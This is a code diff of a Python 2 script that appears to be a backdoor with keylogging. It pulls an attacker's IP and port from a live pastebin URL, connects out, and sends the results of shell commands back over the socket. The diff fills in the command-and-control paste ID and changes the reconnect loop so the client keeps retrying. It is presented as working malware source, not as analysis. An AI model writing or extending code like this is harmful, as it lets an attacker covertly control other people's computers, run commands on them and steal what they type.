@@ -213,8 +213,7 @@ def getKeyLogFile(s, path):
 
 def getIpAddress():
     # Create a pastebin post and paste the raw url here
-    response = urllib2.urlopen("""https://pastebin.com/raw/""")
-    #=============================================================
+    response = urllib2.urlopen("""https://pastebin.com/raw/xtMtpGD8""")
     data = response.read()
     response.close()
     info = data.split(':')
@@ -302,20 +301,24 @@ def connect(ip_address, port):
             s.send( CMD.stdout.read()  ) 
             s.send( CMD.stderr.read()  ) 
 
-def main ():
+def run():
     count = 0
     ip_address, port = getIpAddress()
     while True:
         try:
             if connect(ip_address, port) == 1:
-                break
+                return True
         except:
-            sleep_for = random.randrange(1, 10)
-            time.sleep(sleep_for)
             count += 1
-            if count == 10:
-                main()
+            if count == 2:
+                return False
             pass
+
+def main ():
+    while True: 
+        stop = run()
+        if stop:
+            break 
 
 if __name__ == "__main__":
     main()
